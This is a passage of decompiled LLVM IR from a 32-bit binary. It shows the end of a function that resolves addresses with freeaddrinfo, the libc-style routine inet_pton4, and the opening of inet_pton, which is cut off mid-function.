  br i1 %v0_805eb34, label %dec_label_pc_805eb30.dec_label_pc_805ebb5.loopexit_crit_edge, label %dec_label_pc_805eb3a

dec_label_pc_805eb30.dec_label_pc_805ebb5.loopexit_crit_edge: ; preds = %dec_label_pc_805eb30
  %v0_805ebb5.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805ebb5

dec_label_pc_805eb3a:                             ; preds = %dec_label_pc_805eb30, %dec_label_pc_805ead7
  %v3_805eb3a = load i32, i32* %stack_var_-92, align 4
  %v4_805eb3a = add i32 %v3_805eb3a, 1
  store i32 %v4_805eb3a, i32* %stack_var_-92, align 4
  %v4_805eb3e = icmp eq i32 %stack_var_-80.235, 0
  br i1 %v4_805eb3e, label %dec_label_pc_805eb3a.dec_label_pc_805eb51_crit_edge, label %dec_label_pc_805eb45

dec_label_pc_805eb3a.dec_label_pc_805eb51_crit_edge: ; preds = %dec_label_pc_805eb3a
  %v4_805eb5e.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805eb51

dec_label_pc_805eb45:                             ; preds = %dec_label_pc_805eb3a
  %v1_805eb49 = add i32 %stack_var_-80.235, 4
  %v2_805eb49 = inttoptr i32 %v1_805eb49 to i32*
  %v3_805eb49 = load i32, i32* %v2_805eb49, align 4
  store i32 %v3_805eb49, i32* %eax.global-to-local, align 4
  %v1_805eb4c = load i32, i32* @ebp, align 4
  %v2_805eb4c = add i32 %v1_805eb4c, 4
  %v3_805eb4c = inttoptr i32 %v2_805eb4c to i32*
  %v4_805eb4c = load i32, i32* %v3_805eb4c, align 4
  %v15_805eb4c = icmp eq i32 %v3_805eb49, %v4_805eb4c
  br i1 %v15_805eb4c, label %dec_label_pc_805ebb5, label %dec_label_pc_805eb51

dec_label_pc_805eb51:                             ; preds = %dec_label_pc_805eb3a.dec_label_pc_805eb51_crit_edge, %dec_label_pc_805eb45
  %v4_805eb5e = phi i32 [ %v4_805eb5e.pre, %dec_label_pc_805eb3a.dec_label_pc_805eb51_crit_edge ], [ %v1_805eb4c, %dec_label_pc_805eb45 ]
  %v5_805eb5e = add i32 %v4_805eb5e, 4
  %v6_805eb5e = inttoptr i32 %v5_805eb5e to i32*
  %v7_805eb5e = load i32, i32* %v6_805eb5e, align 4
  call void @__pseudo_call(i32 %v7_805eb5e)
  %v0_805eb64 = load i32, i32* %eax.global-to-local, align 4
  %v1_805eb64 = icmp eq i32 %v0_805eb64, 0
  store i32 %v0_805eb64, i32* @esi, align 4
  br i1 %v1_805eb64, label %dec_label_pc_805ebb1, label %dec_label_pc_805eb6a

dec_label_pc_805eb6a:                             ; preds = %dec_label_pc_805eb51
  %v0_805eb6a = load i32, i32* @edi, align 4
  %v1_805eb6a = add i32 %v0_805eb6a, 4
  %v2_805eb6a = inttoptr i32 %v1_805eb6a to i32*
  %v3_805eb6a = load i32, i32* %v2_805eb6a, align 4
  %v4_805eb6a = icmp eq i32 %v3_805eb6a, 0
  %v1_805eb6e = icmp eq i1 %v4_805eb6a, false
  br i1 %v1_805eb6e, label %dec_label_pc_805eb7f, label %dec_label_pc_805eb70

dec_label_pc_805eb70:                             ; preds = %dec_label_pc_805eb6a
  %v3_805eb70 = and i32 %v0_805eb64, 256
  %v4_805eb70 = icmp eq i32 %v3_805eb70, 0
  br i1 %v4_805eb70, label %dec_label_pc_805eb7f, label %dec_label_pc_805eb75

dec_label_pc_805eb75:                             ; preds = %dec_label_pc_805eb70
  %v0_805eb79 = load i32, i32* @ebp, align 4
  %v1_805ebb8 = add i32 %v0_805eb79, 4
  %v2_805ebb8 = inttoptr i32 %v1_805ebb8 to i32*
  %v3_805ebb8 = load i32, i32* %v2_805ebb8, align 4
  %v4_805ebb8 = icmp eq i32 %v3_805ebb8, 0
  %v1_805ebbc = icmp eq i1 %v4_805ebb8, false
  br i1 %v1_805ebbc, label %dec_label_pc_805eac5, label %dec_label_pc_805ebc2

dec_label_pc_805eb7f:                             ; preds = %dec_label_pc_805eb70, %dec_label_pc_805eb6a
  %v3_805eb7f = load i8*, i8** %stack_var_-24, align 4
  %v4_805eb7f = ptrtoint i8* %v3_805eb7f to i32
  store i32 %v4_805eb7f, i32* %eax.global-to-local, align 4
  %v1_805eb83 = icmp eq i8* %v3_805eb7f, null
  br i1 %v1_805eb83, label %dec_label_pc_805ebfd, label %dec_label_pc_805eb87

dec_label_pc_805eb87:                             ; preds = %dec_label_pc_805eb7f
  %v1_805eb8b = call i32 @freeaddrinfo(i32 %v4_805eb7f)
  store i32 %v1_805eb8b, i32* %eax.global-to-local, align 4
  %v0_805eb93.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805ebfd

dec_label_pc_805ebb1:                             ; preds = %dec_label_pc_805eb51
  %v0_805ebb1 = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805ebb5

dec_label_pc_805ebb5:                             ; preds = %dec_label_pc_805eb45, %dec_label_pc_805eacf, %dec_label_pc_805eb30.dec_label_pc_805ebb5.loopexit_crit_edge, %dec_label_pc_805ebb1
  %stack_var_-80.1 = phi i32 [ %v0_805ebb1, %dec_label_pc_805ebb1 ], [ %stack_var_-80.235, %dec_label_pc_805eb30.dec_label_pc_805ebb5.loopexit_crit_edge ], [ %stack_var_-80.235, %dec_label_pc_805eb45 ], [ %stack_var_-80.235, %dec_label_pc_805eacf ]
  %v0_805ebb5 = phi i32 [ %v0_805ebb1, %dec_label_pc_805ebb1 ], [ %v0_805ebb5.pre.pre, %dec_label_pc_805eb30.dec_label_pc_805ebb5.loopexit_crit_edge ], [ %v1_805eb4c, %dec_label_pc_805eb45 ], [ %v0_805eac8, %dec_label_pc_805eacf ]
  %v1_805ebb5 = add i32 %v0_805ebb5, 8
  store i32 %v1_805ebb5, i32* @ebp, align 4
  %v1_805ebb823 = add i32 %v0_805ebb5, 12
  %v2_805ebb824 = inttoptr i32 %v1_805ebb823 to i32*
  %v3_805ebb825 = load i32, i32* %v2_805ebb824, align 4
  %v4_805ebb826 = icmp eq i32 %v3_805ebb825, 0
  %v1_805ebbc33 = icmp eq i1 %v4_805ebb826, false
  br i1 %v1_805ebbc33, label %dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge, label %dec_label_pc_805ebc2

dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge: ; preds = %dec_label_pc_805ebb5
  %v0_805eac5.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805eac5.lr.ph

dec_label_pc_805eac5.lr.ph:                       ; preds = %dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge, %dec_label_pc_805eac5.lr.ph.lr.ph
  %v0_805eac5.pre = phi i32 [ %v0_805eac5.pre95, %dec_label_pc_805eac5.lr.ph.lr.ph ], [ %v0_805eac5.pre.pre, %dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge ]
  %v0_805eac887 = phi i32 [ ptrtoint (i32* @global_var_806e4fc.667 to i32), %dec_label_pc_805eac5.lr.ph.lr.ph ], [ %v1_805ebb5, %dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge ]
  %stack_var_-80.2.ph67 = phi i32 [ %stack_var_-80.0, %dec_label_pc_805eac5.lr.ph.lr.ph ], [ %stack_var_-80.1, %dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge ]
  %stack_var_-88.0.ph66 = phi i32 [ 0, %dec_label_pc_805eac5.lr.ph.lr.ph ], [ %stack_var_-88.034, %dec_label_pc_805ebb5.dec_label_pc_805eac5.lr.ph_crit_edge ]
  br label %dec_label_pc_805eac5

dec_label_pc_805ebc2:                             ; preds = %dec_label_pc_805ebb5, %dec_label_pc_805eb75, %dec_label_pc_805eaa3
  %stack_var_-88.0.lcssa = phi i32 [ 0, %dec_label_pc_805eaa3 ], [ %v0_805eb64, %dec_label_pc_805eb75 ], [ %stack_var_-88.034, %dec_label_pc_805ebb5 ]
  %v4_805ebc2 = icmp eq i32 %stack_var_-88.0.lcssa, 0
  store i32 -6, i32* %eax.global-to-local, align 4
  br i1 %v4_805ebc2, label %dec_label_pc_805ec0e, label %dec_label_pc_805ebce

dec_label_pc_805ebce:                             ; preds = %dec_label_pc_805ebc2
  %v3_805ebce = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ebce, i32* %eax.global-to-local, align 4
  %v1_805ebd2 = icmp eq i32 %v3_805ebce, 0
  br i1 %v1_805ebd2, label %dec_label_pc_805ebe0, label %dec_label_pc_805ebd6

dec_label_pc_805ebd6:                             ; preds = %dec_label_pc_805ebce
  %v2_805ebda = inttoptr i32 %arg4 to i32*
  store i32 %v3_805ebce, i32* %v2_805ebda, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ec0e

dec_label_pc_805ebe0:                             ; preds = %dec_label_pc_805ebce
  %v1_805ebe5 = icmp eq i1 %v4_805ea8c, false
  br i1 %v1_805ebe5, label %dec_label_pc_805ebf2, label %dec_label_pc_805ebe7

dec_label_pc_805ebe7:                             ; preds = %dec_label_pc_805ebe0
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ec0e

dec_label_pc_805ebf2:                             ; preds = %dec_label_pc_805ebe0
  br label %dec_label_pc_805ec04

dec_label_pc_805ebfd:                             ; preds = %dec_label_pc_805eb87, %dec_label_pc_805eb7f
  %v0_805eb93 = phi i32 [ %v0_805eb64, %dec_label_pc_805eb7f ], [ %v0_805eb93.pre, %dec_label_pc_805eb87 ]
  %v13_805ebfd = and i32 %v0_805eb93, -257
  %v1_805ec00 = sub i32 0, %v13_805ebfd
  store i32 %v1_805ec00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ec0e

dec_label_pc_805ec04:                             ; preds = %dec_label_pc_805ebf2, %dec_label_pc_805ea44, %dec_label_pc_805e9d9
  store i32 -2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ec0e

dec_label_pc_805ec0b:                             ; preds = %dec_label_pc_805ea0e, %dec_label_pc_805e9fd
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ec0e

dec_label_pc_805ec0e:                             ; preds = %dec_label_pc_805ebe7, %dec_label_pc_805ebc2, %dec_label_pc_805ea6b, %dec_label_pc_805ec04, %dec_label_pc_805ebfd, %dec_label_pc_805ebd6, %dec_label_pc_805ec0b
  %v0_805ec15 = phi i32 [ 0, %dec_label_pc_805ebe7 ], [ -6, %dec_label_pc_805ebc2 ], [ -8, %dec_label_pc_805ea6b ], [ -2, %dec_label_pc_805ec04 ], [ %v1_805ec00, %dec_label_pc_805ebfd ], [ 0, %dec_label_pc_805ebd6 ], [ -1, %dec_label_pc_805ec0b ]
  %v2_805ec11 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_805ec11, i32* @ebx, align 4
  store i32 %v0_805e98e, i32* @esi, align 4
  store i32 %v0_805e98d, i32* @edi, align 4
  store i32 %v0_805e98c, i32* @ebp, align 4
  ret i32 %v0_805ec15

; uselistorder directives
  uselistorder i32 %v0_805ebb5, { 1, 0 }
  uselistorder i32 %v0_805eb79, { 1, 0, 2 }
  uselistorder i32 %v0_805eb6a, { 1, 0 }
  uselistorder i32 %v0_805eb64, { 1, 0, 3, 4, 5, 2 }
  uselistorder i32 %v0_805eb11, { 1, 0, 2 }
  uselistorder i32 %v1_805eadf, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_805eac8, { 1, 0 }
  uselistorder i32 %v3_805eac5, { 1, 0, 2 }
  uselistorder i32 %stack_var_-80.235, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v4_805ea8c, { 1, 0 }
  uselistorder i32 %v0_805ea65, { 0, 1, 2, 4, 3 }
  uselistorder i8** %stack_var_-24, { 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32)* @freeaddrinfo, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805ec0e, { 6, 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_805ebb5, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805eb51, { 1, 0 }
  uselistorder label %dec_label_pc_805eb30, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805eaa3, { 1, 0 }
  uselistorder label %dec_label_pc_805ea8c, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_805e9fd, { 1, 0 }
  uselistorder label %dec_label_pc_805e9d9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e9c4, { 2, 0, 1 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_805ec1e = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_805ec21 = load i32, i32* @ebx, align 4
  store i32 %v0_805ec21, i32* %stack_var_-16, align 4
  %v0_805ec22 = load i32, i32* @eax, align 4
  store i32 %v0_805ec22, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_805ec24 = ptrtoint i32* %stack_var_-44 to i32
  %v2_805ec27 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805ec27, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805ec6f15 = inttoptr i32 %v0_805ec22 to i8*
  %v2_805ec6f16 = load i8, i8* %v1_805ec6f15, align 1
  %v3_805ec6f17 = sext i8 %v2_805ec6f16 to i32
  store i32 %v3_805ec6f17, i32* @ecx, align 4
  %v1_805ec7218 = add i32 %v0_805ec22, 1
  store i32 %v1_805ec7218, i32* %ebx.global-to-local, align 4
  %v1_805ec7319 = icmp eq i8 %v2_805ec6f16, 0
  store i1 %v1_805ec7319, i1* %zf.global-to-local, align 1
  %v1_805ec7521 = icmp eq i1 %v1_805ec7319, false
  br i1 %v1_805ec7521, label %dec_label_pc_805ec32, label %dec_label_pc_805ec77

dec_label_pc_805ec32:                             ; preds = %entry, %dec_label_pc_805ec6f.backedge
  %v3_805ec6f23 = phi i32 [ %v3_805ec6f, %dec_label_pc_805ec6f.backedge ], [ %v3_805ec6f17, %entry ]
  %v2_805ec6f22 = phi i8 [ %v2_805ec6f, %dec_label_pc_805ec6f.backedge ], [ %v2_805ec6f16, %entry ]
  %v1_805ec32 = add nsw i32 %v3_805ec6f23, -48
  store i32 %v1_805ec32, i32* @eax, align 4
  %v9_805ec35 = icmp eq i8 %v2_805ec6f22, 57
  store i1 %v9_805ec35, i1* %zf.global-to-local, align 1
  %v6_805ec38 = icmp ugt i32 %v1_805ec32, 9
  br i1 %v6_805ec38, label %dec_label_pc_805ec5b, label %dec_label_pc_805ec3a

dec_label_pc_805ec3a:                             ; preds = %dec_label_pc_805ec32
  %v0_805ec3a = load i32, i32* @esi, align 4
  %v1_805ec3a = inttoptr i32 %v0_805ec3a to i8*
  %v2_805ec3a = load i8, i8* %v1_805ec3a, align 1
  %v2_805ec3d = zext i8 %v2_805ec3a to i32
  %v3_805ec3d = mul nuw nsw i32 %v2_805ec3d, 10
  %v3_805ec40 = add nsw i32 %v3_805ec3d, %v1_805ec32
  store i32 %v3_805ec40, i32* @eax, align 4
  %v9_805ec44 = icmp eq i32 %v3_805ec40, 255
  store i1 %v9_805ec44, i1* %zf.global-to-local, align 1
  %v6_805ec49 = icmp ugt i32 %v3_805ec40, 255
  br i1 %v6_805ec49, label %dec_label_pc_805ec94, label %dec_label_pc_805ec4b

dec_label_pc_805ec4b:                             ; preds = %dec_label_pc_805ec3a
  %v0_805ec4b = load i32, i32* @edx, align 4
  %v1_805ec4b = icmp eq i32 %v0_805ec4b, 0
  store i1 %v1_805ec4b, i1* %zf.global-to-local, align 1
  %v1_805ec4d = trunc i32 %v3_805ec40 to i8
  store i8 %v1_805ec4d, i8* %v1_805ec3a, align 1
  %v0_805ec4f = load i1, i1* %zf.global-to-local, align 1
  %v1_805ec4f = icmp eq i1 %v0_805ec4f, false
  br i1 %v1_805ec4f, label %dec_label_pc_805ec6f.backedge, label %dec_label_pc_805ec51

dec_label_pc_805ec51:                             ; preds = %dec_label_pc_805ec4b
  %v0_805ec51 = load i32, i32* @edi, align 4
  %v1_805ec51 = add i32 %v0_805ec51, 1
  store i32 %v1_805ec51, i32* @edi, align 4
  %v1_805ec52 = add i32 %v0_805ec51, -3
  %v6_805ec52 = sub i32 2, %v0_805ec51
  %v7_805ec52 = and i32 %v6_805ec52, %v1_805ec51
  %v8_805ec52 = icmp slt i32 %v7_805ec52, 0
  %v9_805ec52 = icmp eq i32 %v1_805ec52, 0
  store i1 %v9_805ec52, i1* %zf.global-to-local, align 1
  %v10_805ec52 = icmp slt i32 %v1_805ec52, 0
  %v3_805ec55 = icmp eq i1 %v10_805ec52, %v8_805ec52
  %v4_805ec55 = icmp eq i1 %v9_805ec52, false
  %v5_805ec55 = and i1 %v4_805ec55, %v3_805ec55
  br i1 %v5_805ec55, label %dec_label_pc_805ec94, label %dec_label_pc_805ec57

dec_label_pc_805ec57:                             ; preds = %dec_label_pc_805ec51
  %v0_805ec57 = load i32, i32* @edx, align 4
  %v1_805ec57 = and i32 %v0_805ec57, -256
  %v2_805ec57 = or i32 %v1_805ec57, 1
  store i32 %v2_805ec57, i32* @edx, align 4
  br label %dec_label_pc_805ec6f.backedge

dec_label_pc_805ec5b:                             ; preds = %dec_label_pc_805ec32
  %v9_805ec5b = icmp eq i8 %v2_805ec6f22, 46
  store i1 %v9_805ec5b, i1* %zf.global-to-local, align 1
  %v1_805ec5e = icmp eq i1 %v9_805ec5b, false
  br i1 %v1_805ec5e, label %dec_label_pc_805ec94, label %dec_label_pc_805ec60

dec_label_pc_805ec60:                             ; preds = %dec_label_pc_805ec5b
  %v0_805ec60 = load i32, i32* @edx, align 4
  %v1_805ec60 = icmp eq i32 %v0_805ec60, 0
  store i1 %v1_805ec60, i1* %zf.global-to-local, align 1
  br i1 %v1_805ec60, label %dec_label_pc_805ec94, label %dec_label_pc_805ec64

dec_label_pc_805ec64:                             ; preds = %dec_label_pc_805ec60
  %v0_805ec64 = load i32, i32* @edi, align 4
  %v9_805ec64 = icmp eq i32 %v0_805ec64, 4
  store i1 %v9_805ec64, i1* %zf.global-to-local, align 1
  br i1 %v9_805ec64, label %dec_label_pc_805ec94, label %dec_label_pc_805ec69

dec_label_pc_805ec69:                             ; preds = %dec_label_pc_805ec64
  %v0_805ec69 = load i32, i32* @esi, align 4
  %v1_805ec69 = add i32 %v0_805ec69, 1
  store i32 %v1_805ec69, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_805ec6c = inttoptr i32 %v1_805ec69 to i8*
  store i8 0, i8* %v1_805ec6c, align 1
  br label %dec_label_pc_805ec6f.backedge

dec_label_pc_805ec6f.backedge:                    ; preds = %dec_label_pc_805ec69, %dec_label_pc_805ec57, %dec_label_pc_805ec4b
  %v0_805ec6f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ec6f = inttoptr i32 %v0_805ec6f.pre to i8*
  %v2_805ec6f = load i8, i8* %v1_805ec6f, align 1
  %v3_805ec6f = sext i8 %v2_805ec6f to i32
  store i32 %v3_805ec6f, i32* @ecx, align 4
  %v1_805ec72 = add i32 %v0_805ec6f.pre, 1
  store i32 %v1_805ec72, i32* %ebx.global-to-local, align 4
  %v1_805ec73 = icmp eq i8 %v2_805ec6f, 0
  store i1 %v1_805ec73, i1* %zf.global-to-local, align 1
  %v1_805ec75 = icmp eq i1 %v1_805ec73, false
  br i1 %v1_805ec75, label %dec_label_pc_805ec32, label %dec_label_pc_805ec6f.dec_label_pc_805ec77_crit_edge

dec_label_pc_805ec6f.dec_label_pc_805ec77_crit_edge: ; preds = %dec_label_pc_805ec6f.backedge
  %v0_805ec77.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805ec77

dec_label_pc_805ec77:                             ; preds = %dec_label_pc_805ec6f.dec_label_pc_805ec77_crit_edge, %entry
  %v0_805ec77 = phi i32 [ %v0_805ec77.pre, %dec_label_pc_805ec6f.dec_label_pc_805ec77_crit_edge ], [ 0, %entry ]
  %v10_805ec77 = icmp eq i32 %v0_805ec77, 3
  store i1 %v10_805ec77, i1* %zf.global-to-local, align 1
  %v7_805ec7a = icmp sgt i32 %v0_805ec77, 3
  br i1 %v7_805ec7a, label %dec_label_pc_805ec7c, label %dec_label_pc_805ec94

dec_label_pc_805ec7c:                             ; preds = %dec_label_pc_805ec77
  %v0_805ec7c = load i32, i32* @eax, align 4
  %v3_805ec85 = bitcast i32* %stack_var_-20 to i16*
  %v4_805ec85 = call i32 @memcpy(i16* %v3_805ec85, i32 4, i32 %v0_805ec7c)
  %v0_805ec8f = load i32, i32* @esp, align 4
  %v6_805ec8f = icmp eq i32 %v0_805ec8f, -16
  store i1 %v6_805ec8f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805ec96

dec_label_pc_805ec94:                             ; preds = %dec_label_pc_805ec64, %dec_label_pc_805ec60, %dec_label_pc_805ec5b, %dec_label_pc_805ec51, %dec_label_pc_805ec3a, %dec_label_pc_805ec77
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_805ec96.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805ec96

dec_label_pc_805ec96:                             ; preds = %dec_label_pc_805ec7c, %dec_label_pc_805ec94
  %v0_805ec96 = phi i32 [ %v15_805ec24, %dec_label_pc_805ec7c ], [ %v0_805ec96.pre, %dec_label_pc_805ec94 ]
  %v0_805ec9d = phi i32 [ 1, %dec_label_pc_805ec7c ], [ 0, %dec_label_pc_805ec94 ]
  %v9_805ec96 = icmp eq i32 %v0_805ec96, -28
  store i1 %v9_805ec96, i1* %zf.global-to-local, align 1
  %v2_805ec99 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805ec99, i32* @ebx, align 4
  store i32 %v0_805ec1e, i32* @esi, align 4
  ret i32 %v0_805ec9d

; uselistorder directives
  uselistorder i32 %v0_805ec77, { 1, 0 }
  uselistorder i32 %v3_805ec6f, { 1, 0 }
  uselistorder i8 %v2_805ec6f, { 1, 2, 0 }
  uselistorder i1 %v9_805ec64, { 1, 0 }
  uselistorder i32 %v1_805ec52, { 1, 0 }
  uselistorder i32 %v3_805ec40, { 1, 2, 0, 3 }
  uselistorder i8 %v2_805ec6f22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805ec96, { 1, 0 }
  uselistorder label %dec_label_pc_805ec94, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805ec32, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805ec9e = load i32, i32* @ebp, align 4
  %v0_805ec9f = load i32, i32* @edi, align 4
  %v0_805eca0 = load i32, i32* @esi, align 4
  %v0_805eca1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805eca9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805eca9, i32* @edi, align 4
  %v9_805ecad = icmp eq i32 %arg1, 2
  br i1 %v9_805ecad, label %dec_label_pc_805ecbd, label %dec_label_pc_805ecb2

dec_label_pc_805ecb2:                             ; preds = %entry
  %v9_805ecb2 = icmp eq i32 %arg1, 10
  %v1_805ecb5 = icmp eq i1 %v9_805ecb2, false
  br i1 %v1_805ecb5, label %dec_label_pc_805ee4e, label %dec_label_pc_805eccd

dec_label_pc_805ecbd:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_805eca9, i32* @eax, align 4
  %v3_805ecc3 = call i32 @inet_pton4(i32 %v0_805eca1, i32 %v0_805eca0, i32 %v0_805ec9f)
  store i32 %v3_805ecc3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ee60

dec_label_pc_805eccd:                             ; preds = %dec_label_pc_805ecb2
  %v2_805ecd2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805ecd2, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_805ecd7 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_805ecd7, i32* @ebx, align 4
  %v2_805ecde = add i32 %v5_805ecd7, 16
  store i32 %v2_805ecde, i32* %eax.global-to-local, align 4
  %v0_805ece8 = load i32, i32* @edi, align 4
  %v1_805ece8 = inttoptr i32 %v0_805ece8 to i8*
  %v2_805ece8 = load i8, i8* %v1_805ece8, align 1
  %v11_805ece8 = icmp eq i8 %v2_805ece8, 58
  %v1_805eceb = icmp eq i1 %v11_805ece8, false
  br i1 %v1_805eceb, label %dec_label_pc_805ed7e, label %dec_label_pc_805eced

dec_label_pc_805eced:                             ; preds = %dec_label_pc_805eccd
  %v1_805eced = add i32 %v0_805ece8, 1
  store i32 %v1_805eced, i32* @edi, align 4
  %v1_805ecee = inttoptr i32 %v1_805eced to i8*
  %v2_805ecee = load i8, i8* %v1_805ecee, align 1
  %v11_805ecee = icmp eq i8 %v2_805ecee, 58
  %v1_805ecf1 = icmp eq i1 %v11_805ecee, false
  br i1 %v1_805ecf1, label %dec_label_pc_805ee5e, label %dec_label_pc_805ed7e

dec_label_pc_805ed05:                             ; preds = %dec_label_pc_805edbe
  %v0_805ed06 = load i32, i32* @edi, align 4
  %v1_805ed06 = add i32 %v0_805ed06, 1
  store i32 %v1_805ed06, i32* @edi, align 4
  %v4_805ed0e = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806e557.668, i32 0, i32 0), i32 %v2_805edc5)
  store i32 %v4_805ed0e, i32* %eax.global-to-local, align 4
  %v1_805ed16 = icmp eq i32 %v4_805ed0e, 0
  br i1 %v1_805ed16, label %dec_label_pc_805ed35, label %dec_label_pc_805ed1a

dec_label_pc_805ed1a:                             ; preds = %dec_label_pc_805ed05
  %v0_805ed1a = load i32, i32* @ebp, align 4
  %v2_805ed1a = mul i32 %v0_805ed1a, 16
  %v1_805ed1d = add i32 %v4_805ed0e, -134669655
  store i32 %v1_805ed1d, i32* %eax.global-to-local, align 4
  %v2_805ed22 = or i32 %v2_805ed1a, %v1_805ed1d
  store i32 %v2_805ed22, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_805ed22, 65536
  br i1 %tmp, label %dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge, label %dec_label_pc_805ee5e

dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge: ; preds = %dec_label_pc_805ed1a
  %v0_805edbe.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805edbe.outer

dec_label_pc_805edbe.outer:                       ; preds = %dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge, %dec_label_pc_805ed7e
  %v0_805edbe.pre = phi i32 [ %v0_805edbe.pre.pre, %dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_805ed7e ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_805ed7e ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_805ed7e ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805ed1a.dec_label_pc_805edbe.outer_crit_edge ], [ 0, %dec_label_pc_805ed7e ]
  %v4_805ed3a = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805ed3f = icmp eq i1 %v4_805ed3a, false
  br label %dec_label_pc_805edbe

dec_label_pc_805ed35:                             ; preds = %dec_label_pc_805ed05
  %v0_805ed35 = load i32, i32* @esi, align 4
  %v9_805ed35 = icmp eq i32 %v0_805ed35, 58
  %v1_805ed38 = icmp eq i1 %v9_805ed35, false
  br i1 %v1_805ed38, label %dec_label_pc_805ed8a, label %dec_label_pc_805ed3a

dec_label_pc_805ed3a:                             ; preds = %dec_label_pc_805ed35
  br i1 %v1_805ed3f, label %dec_label_pc_805ed56, label %dec_label_pc_805ed41

dec_label_pc_805ed41:                             ; preds = %dec_label_pc_805ed3a
  %v5_805ed41 = icmp eq i8* %stack_var_-44.1, null
  %v1_805ed46 = icmp eq i1 %v5_805ed41, false
  br i1 %v1_805ed46, label %dec_label_pc_805ee5e, label %dec_label_pc_805ed4c

dec_label_pc_805ed4c:                             ; preds = %dec_label_pc_805ed41
  %v0_805ed4c = load i32, i32* @ebx, align 4
  %v5_805ed4c = inttoptr i32 %v0_805ed4c to i8*
  %v0_805ed50 = load i32, i32* @edi, align 4
  %v5_805ed50 = inttoptr i32 %v0_805ed50 to i8*
  br label %dec_label_pc_805edbe

dec_label_pc_805ed56:                             ; preds = %dec_label_pc_805ed3a
  %v0_805ed56 = load i32, i32* @edi, align 4
